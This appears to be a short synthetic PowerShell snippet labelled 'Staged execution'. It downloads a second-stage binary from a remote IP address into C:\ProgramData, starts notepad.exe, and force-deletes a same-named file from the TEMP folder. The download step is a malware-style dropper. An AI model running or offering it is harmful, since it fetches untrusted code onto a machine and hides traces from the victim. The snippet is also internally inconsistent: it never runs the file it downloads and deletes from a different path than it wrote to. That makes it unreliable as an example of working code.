
<# Staged execution #> $RemoteUrl = 'https://203.0.113.31/cdn/stage2.bin'; $DropPath = "C:\ProgramData\stage2.bin"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $DropPath -UseBasicParsing; Start-Process -FilePath "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
